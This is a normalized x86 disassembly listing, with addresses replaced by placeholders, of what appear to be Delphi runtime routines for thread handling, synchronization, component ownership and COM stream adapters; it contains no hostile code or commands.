mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
jmp r-xdata
sub_42dd60
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
mov edx esi
call sub_42deb0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
mov eax [ esi + 0x38 ]
call sub_4481b0
call sub_42d9a4
test bl bl
jle r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
push eax
call CloseHandle
mov eax esi
call sub_42e194
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
call sub_42e1b8
mov eax esi
call sub_42e16c
sub_42ddf4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_42de62
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de69
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_439344
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_42deb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42df63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df6a
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4246e8
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4245dc
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_44ab74
mov edx 0xc
mov eax ebx
call sub_4474a8
mov eax [ ebx ]
mov eax [ eax + 0xc ]
cmp eax [ ebp + 0xc ]
jne r-xdata
sub_42df74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax 0xc
call sub_44748c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventW
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
movzx ebx [ ebp - 0x5 ]
xor bl 0x1
test bl bl
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_424590
call sub_42d98c
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_42e111
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42e0ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e0f1
push rw-data
call LeaveCriticalSection
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_42e0cb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_42e0f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call CloseHandle
sub_42e138
push ebp
mov ebp esp
push ebx
mov ebx eax
mov [ ebx + 0x20 ] ebx
xor eax eax
mov [ ebx + 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
lea eax [ ebx + 0x30 ]
call sub_44b8d8
lea edx [ ebx + 0x20 ]
xor ecx ecx
mov eax [ ebx ]
call sub_42df74
pop ebx
pop ebp
retn 0x8
sub_42e16c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_42de70
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_42e1b8
push ebx
push esi
add esp 0xffffffd8
mov esi eax
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_42de70
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageW
test ebx ebx
jne r-xdata
xor eax eax
call sub_42d9b0
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_42de70
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_42e278
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_42e43c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42e2c4
push ebx
push esi
push ecx
call sub_44873c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_42e534
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42e4d8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebx
call sub_424d94
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_42e4a0
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4486e4
lea eax [ ebx + 0x14 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4246e8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_42e354
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_424744
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_424590
mov edx ebx
mov eax esi
call sub_42e354
sub_42e3e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_424590
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x10 ] eax
sub_42e414
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4248a0
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4481b0
xor eax eax
mov [ ebx + 0x10 ] eax
sub_42e43c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4483f8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_42e3e8
mov dl 0x1
mov eax ebx
call sub_42e984
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx ebx
call sub_42e4a0
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_42e934
sub_42e4a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_42e984
mov edx ebx
mov eax esi
call sub_42e414
pop edi
pop esi
pop ebx
retn
sub_42e4d8
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4247d4
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_42e4a0
jmp r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_42e414
sub_42e534
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4246e8
call sub_42e534
inc edi
dec esi
jne r-xdata
sub_42e570
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4248a0
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4481b0
xor eax eax
mov [ ebx + 0x14 ] eax
sub_42e594
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42e570
mov edx ebx
mov eax esi
call sub_42e570
pop esi
pop ebx
retn
sub_42e5b0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_42e594
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4246e8
movzx ecx [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
test ebx ebx
jge r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub_42e610
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_42e3a8
push ebx
push sub_42e3d0
movzx eax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_42e3bc
push ebx
push sub_42e3dc
movzx eax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_42e718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43501c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_42e7b0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_42e7b0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4246e8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_43501c
test al al
jne r-xdata
sub_42e800
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_4353d0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
xor edx edx
mov eax ebx
call sub_42e984
mov edx esi
mov eax ebx
call sub_42e890
mov dl 0x1
mov eax ebx
call sub_42e984
sub_42e8a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4246e8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_424674
sub_42e8e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_424744
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4245dc
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_424768
sub_42e934
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_42e8d0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_42e8a4
mov cl 0x1
mov edx ebx
call sub_42e934
inc edi
dec ebp
jne r-xdata
sub_42e984
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
call sub_44866c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] esi
jmp r-xdata
sub_42e9ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_42e9d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_42ea1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_448278
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42ea7c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_42eaa0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42eae8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
mov edx esi
call sub_42ed28
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_42eb50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_42ed28
mov edx ebx
mov eax esi
call sub_42ed1c
sub_42eb94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e278
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42ebd8
push ebx
push esi
push edi
call sub_44873c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_42e2c4
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
cmp [ edi + 0x50 ] 0x0
je r-xdata
mov edx edi
call sub_42e594
lea eax [ edi + 0x50 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
test bl bl
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4486e4
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4247d4
mov edx eax
mov eax edi
call sub_42ed28
sub_42ec48
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42e5b0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_42ec74
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_42ec90
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42ecac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_42ed28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4245dc
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4246e8
cmp ebp eax
jne r-xdata
sub_42ed68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_42e594
mov edx ebx
call sub_42e354
sub_42ed94
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0xc ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42ede0
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4481b0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_42ee18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42ee67
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42ee80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42eecf
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42eee8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42ef52
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_42ef6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42efb5
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4272f8
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
